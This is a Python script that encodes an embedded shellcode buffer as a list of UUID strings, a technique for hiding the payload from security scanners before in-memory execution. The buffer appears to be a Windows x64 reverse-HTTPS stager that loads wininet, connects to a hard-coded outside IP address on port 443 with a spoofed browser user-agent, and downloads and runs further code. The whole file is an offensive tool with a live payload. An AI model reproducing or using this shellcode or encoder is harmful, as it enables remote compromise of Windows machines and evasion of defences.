import uuid

def convertToUUID(shellcode):
    if len(shellcode)%16 !=0:
        print("\n[*] length:",len(shellcode)+(16-(len(shellcode)%16)))
        addNullbyte = b"\x00" * (16-(len(shellcode)%16))
        shellcode += addNullbyte

    uuids = []
    for i in range(0,len(shellcode),16):
        uuidString = str(uuid.UUID(bytes_le=shellcode[i:i+16]))
        uuids.append(uuidString.replace("'","\""))
    return uuids

if __name__ == '__main__':
    buf = b'''\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xe9\x93\x00\x00\x00\x5a\x48\x89\xc1\x41\xb8\xbb\x01\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x79\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x32\xc0\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\xba\x1f\x00\x00\x00\x6a\x00\x68\x80\x33\x00\x00\x49\x89\xe0\x41\xb9\x04\x00\x00\x00\x41\xba\x75\x46\x9e\x86\xff\xd5\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xb3\xe9\xe4\x01\x00\x00\xe8\x82\xff\xff\xff\x2f\x4c\x70\x58\x49\x00\xdf\xe6\x55\x0b\xc7\x0b\x19\x4d\xb4\x74\x8f\x06\x89\x8a\x62\x17\x8f\xc2\x8a\xc8\x21\xa0\x1b\x2e\x3f\xf9\xcf\x4b\x32\x72\xe2\xe9\x74\x2d\x6c\x32\xf5\xd2\x0e\xca\xb1\x8a\x0a\xc6\xf2\xf8\xec\xe0\x5c\x80\x5e\x86\x62\x24\x8d\x0a\x10\x51\xd6\xda\xaf\x84\xce\x8a\x8a\xa7\xfa\x78\x18\x97\xbc\xb0\x50\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x47\x57\x4a\x53\x29\x0d\x0a\x00\xce\x75\x8d\xfb\x7d\xdb\xd6\x05\x1b\xcb\xc5\x45\xfa\x7e\x21\x5f\xe5\xc3\x0b\x88\xf3\x22\xf4\x2b\xf7\x55\xfa\x5c\x6e\xbd\xde\x31\x99\xbb\xef\x1a\x1e\xee\xb9\x3a\xb1\x56\xbc\xb1\x46\x56\x80\xb3\xf1\x7b\x88\x93\xa2\x76\x7a\x59\x95\x4a\x67\x06\x2d\xcb\x36\xb2\x51\x85\x83\xb8\xfc\x59\x57\xe8\x5b\x21\x57\xa2\x1f\xc0\x5f\x03\x10\xe1\x85\x04\xb0\x60\xe6\xe7\xa7\x98\x52\x32\x40\x44\x47\xdb\x61\xb7\x11\x42\x5a\xf2\x20\x06\xb7\xc6\x9a\x26\xed\x5e\x9a\xfd\x87\x9e\x73\x66\xa9\xe9\xf5\x95\xc7\x74\x63\x4d\x2d\xab\x13\x00\xf5\xe6\x80\x00\xf4\x69\xc8\x55\xde\xe6\x9d\x77\x2c\xb7\x1c\xaf\x22\xe9\xa7\xfc\x1c\x37\xe7\xe9\xd6\xd1\x8e\xfe\x30\xae\x21\x9f\xdd\xe9\xdc\x62\xbc\xfd\xf2\x68\x93\xee\x61\x4c\xe1\x39\x0e\x0c\xc6\x37\xa3\xe3\xa4\x27\xb1\x72\xec\xb0\xf3\xfb\x9c\x79\x79\xf5\x60\x77\x73\xcd\xc5\x73\x61\x01\x09\xb5\xc3\x75\x70\xa9\xb1\x4e\xa2\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x7f\xfd\xff\xff\x31\x2e\x31\x35\x2e\x38\x30\x2e\x31\x30\x32\x00\x49\x96\x02\xd2'''  # shellcode
    u = convertToUUID(buf)
    print(str(u).replace("'","\""))